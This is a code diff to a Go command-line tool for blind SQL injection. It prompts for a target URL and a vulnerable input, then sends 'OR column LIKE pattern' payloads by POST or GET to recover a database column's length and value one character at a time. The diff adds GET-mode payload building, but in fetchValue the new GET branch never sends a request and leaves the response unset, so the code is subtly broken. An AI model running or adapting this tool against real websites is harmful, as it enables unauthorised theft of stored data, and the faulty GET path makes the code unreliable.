@@ -93,21 +93,22 @@ func postForm(targetUrl string, values url.Values) string {
 
 func fetchSize(targetUrl, method, valueType, targetColumn, inputName, extraInputs, extraConditions, errorMessage string) int {
 	test := func(size int) bool {
+		var prefix string
+		if valueType == "STRING" {
+			prefix = "'"
+		} else {
+			prefix = "0"
+		}
+
 		if method == "POST" {
-			attempt := fmt.Sprintf("' OR %s LIKE '%s' %s; #", targetColumn, strings.Repeat("_", size), extraConditions)
+			attempt := fmt.Sprintf("%s OR %s LIKE '%s' %s; #", prefix, targetColumn, strings.Repeat("_", size), extraConditions)
 			values, err := url.ParseQuery(fmt.Sprintf("%s=%s&%s", inputName, url.QueryEscape(attempt), extraInputs))
 			handleError("Cannot create values", err)
 			return !strings.Contains(postForm(targetUrl, values), errorMessage)
 		} else {
 			getUrl := strings.TrimSuffix(targetUrl, "/")
-			var prefix, suffix string
-			if inputName == "" {
-				if valueType == "STRING" {
-					prefix = "'"
-				} else {
-					prefix = "0"
-				}
-			} else {
+			var suffix string
+			if inputName != "" {
 				if valueType == "STRING" {
 					prefix = fmt.Sprintf("?%s='", inputName)
 				} else {
@@ -117,8 +118,13 @@ func fetchSize(targetUrl, method, valueType, targetColumn, inputName, extraInput
 					suffix = fmt.Sprintf("&%s", extraInputs)
 				}
 			}
+			content := fmt.Sprintf(" OR %s LIKE '%s' %s", targetColumn, strings.Repeat("_", size), extraConditions)
 			attempt := prefix
-			attempt += url.QueryEscape(fmt.Sprintf(" OR %s LIKE '%s' %s", targetColumn, strings.Repeat("_", size), extraConditions))
+			if inputName == "" {
+				attempt += content
+			} else {
+				attempt += url.QueryEscape(content)
+			}
 			attempt += suffix
 			getUrl = fmt.Sprintf("%s/%s", getUrl, attempt)
 			return !strings.Contains(doGet(getUrl), errorMessage)
@@ -139,17 +145,45 @@ func fetchValue(size int, targetUrl, method, valueType, targetColumn, inputName,
 		pattern += char
 		pattern += strings.Repeat("_", size-index-1)
 
-		attempt := fmt.Sprintf("' OR %s LIKE '%s' %s; #", targetColumn, pattern, extraConditions)
-		values, err := url.ParseQuery(fmt.Sprintf("%s=%s&%s", inputName, url.QueryEscape(attempt), extraInputs))
-		res, err := http.PostForm(targetUrl, values)
-		if err != nil {
+		var res *http.Response
+		if method == "POST" {
+			attempt := fmt.Sprintf("' OR %s LIKE '%s' %s; #", targetColumn, pattern, extraConditions)
+			values, err := url.ParseQuery(fmt.Sprintf("%s=%s&%s", inputName, url.QueryEscape(attempt), extraInputs))
 			res, err = http.PostForm(targetUrl, values)
+			if err != nil {
+				res, err = http.PostForm(targetUrl, values)
+			}
+			handleError("Cannot post form", err)
+		} else {
+			getUrl := strings.TrimSuffix(targetUrl, "/")
+			var prefix, suffix string
+			if inputName == "" {
+				if valueType == "STRING" {
+					prefix = "'"
+				} else {
+					prefix = "0"
+				}
+			} else {
+				if valueType == "STRING" {
+					prefix = fmt.Sprintf("?%s='", inputName)
+				} else {
+					prefix = fmt.Sprintf("?%s=0", inputName)
+				}
+				if extraInputs != "" {
+					suffix = fmt.Sprintf("&%s", extraInputs)
+				}
+			}
+			attempt := prefix
+			attempt += url.QueryEscape(fmt.Sprintf(" OR %s LIKE '%s' %s", targetColumn, pattern, extraConditions))
+			attempt += suffix
+			getUrl = fmt.Sprintf("%s/%s", getUrl, attempt)
+
 		}
-		handleError("Cannot post form", err)
 
 		defer res.Body.Close()
 
 		bytes, err := ioutil.ReadAll(res.Body)
+		handleError("Cannot read body", err)
 
 		body := string(bytes)
 
@@ -179,13 +213,11 @@ func fetchValue(size int, targetUrl, method, valueType, targetColumn, inputName,
 }
 
 func attack() {
-	var inputName, valueType, extraInputs string
+	var inputName, extraInputs string
 
 	targetUrl := askFor("URL")
 	method := askFor("Method", "POST", "GET")
-	if method == "GET" {
-		valueType = askFor("Value type", "STRING", "INT")
-	}
+	valueType := askFor("Value type", "STRING", "INT")
 	targetColumn := askFor("Target column")
 	if method == "POST" {
 		inputName = askFor("Vunerable input name")
